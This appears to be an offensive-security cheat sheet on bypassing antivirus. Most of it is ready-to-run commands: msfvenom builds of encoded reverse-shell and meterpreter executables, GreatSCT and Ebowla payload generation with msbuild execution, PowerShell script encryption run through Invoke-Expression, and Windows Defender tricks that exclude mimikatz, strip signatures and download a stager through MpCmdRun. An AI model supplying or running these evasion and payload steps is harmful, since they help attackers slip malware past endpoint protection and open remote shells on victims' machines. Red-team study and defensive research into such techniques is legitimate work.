## AV Bypass

* [hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
* [codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
* [github.com/phackt/stager.dll](https://github.com/phackt/stager.dll)
* [hausec.com/2019/02/09/suck-it-windows-defender/]https://hausec.com/2019/02/09/suck-it-windows-defender/)
* [medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
* [medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)


### msfvenom

```
root@kali:$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -a x86 --platform win -e x86/shikata_ga_nai -i 3 -f exe -o rev.exe
root@kali:$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -e x86/shikata_ga_nai -i 9 -f raw | msfvenom --platform windows -a x86 -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 11 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -k -f exe -o met.exe
```



### Veil-Evasion

Hyperion + Pescramble

```
root@kali:$ wine hyperion.exe input.exe output.exe
root@kali:$ wine PEScrambler.exe -i input.exe -o output.exe
```



### GreatSCT

Install and generate a payload:

```
root@kali:$ git clone https://github.com/GreatSCT/GreatSCT ~/tools/GreatSCT
root@kali:$ cd ~/tools/GreatSCT/setup
root@kali:$ ./setup.sh
root@kali:$ cd .. && ./GreatSCT.py
...generate a payload...
root@kali:$ ls -la /usr/share/greatsct-output/handlers/payload.{rc,xml}

root@kali:$ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
```

Exec with `msbuild.exe` and get a shell:

```
PS > cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
```

* [github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [www.youtube.com/watch?v=krC5j1Ab44I&t=3730s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3730s)



### Ebowla

```
$ git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
$ sudo apt install golang mingw-w64 wine -y
$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
$ vi genetic.config
...Edit output_type, payload_type, clean_output, [[ENV_VAR]]...
$ python ebowla.py rev.exe genetic.config && rm rev.exe
$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && rm output/go_symmetric_rev.exe.go
[+] output/ebowla-rev.exe
```



### Invoke-Obfuscation

* [github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
* [www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)



### Out-EncryptedScript.ps1

* [github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
* [powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)

Download:

```
$ curl -L https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1 > outenc.ps1
```

Use:

```
PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
PS > [string] $cmd = gc .\evil
PS > $dec = de "Passw0rd!" s4lt
PS > Invoke-Expression $dec
```



### Tricks


#### Windows Defender

Add path to exclusions (must be elevated):

```
PS > $mimi = "C:\Users\snovvcrash\music\mimi\x64\mimikatz.exe"
PS > Add-MpPreference -ExclusionPath $mimi -AttackSurfaceReductionOnlyExclusions $mimi
```

Remove signatures (if Internet connection is present, it will be downloaded again):

```
PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
```

Download stager with triggering Defender to scan it:

```
PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -Url http://127.0.0.1/met.exe -Path C:\Users\snovvcrash\music\met.exe
```

